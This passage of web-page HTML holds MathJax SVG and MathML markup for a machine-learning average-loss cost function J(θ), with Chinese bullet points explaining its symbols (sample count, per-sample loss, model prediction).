transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2157.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(3213.6,0)"><g data-mml-node="mn" transform="translate(409,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(220,-686)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><rect width="1078" height="60" x="120" y="220"/></g><g data-mml-node="munderover" transform="translate(4698.2,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" transform="translate(411.6,1150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6308.9,0)"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1070,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1620,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2009,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(3458.1,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3902.7,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4371.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4983,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(5983.2,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7350.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo data-mjx-texclass="OP">∑</mo><mrow data-mjx-texclass="ORD"><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow data-mjx-texclass="ORD"><mi>m</mi></mrow></munderover><mrow data-mjx-texclass="ORD"><mi>L</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>;</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>−</mo><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo></mrow></math></mjx-assistive-mml></mjx-container><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 878 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math></mjx-assistive-mml></mjx-container>：样本数量</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>L</mi></math></mjx-assistive-mml></mjx-container>：单个样本的损失计算方式</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.35ex" height="2.587ex" role="img" focusable="false" viewbox="0 -893.3 3690.7 1143.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(939,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2388.1,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2832.7,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3301.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>f</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>;</mo><mi>θ</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>：模型对第<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>i</mi></math></mjx-assistive-mml></mjx-container>个样本的预测值</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="3.093ex" height="2.485ex" role="img" focusable="false" viewbox="0 -893.3 1367.1 1098.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 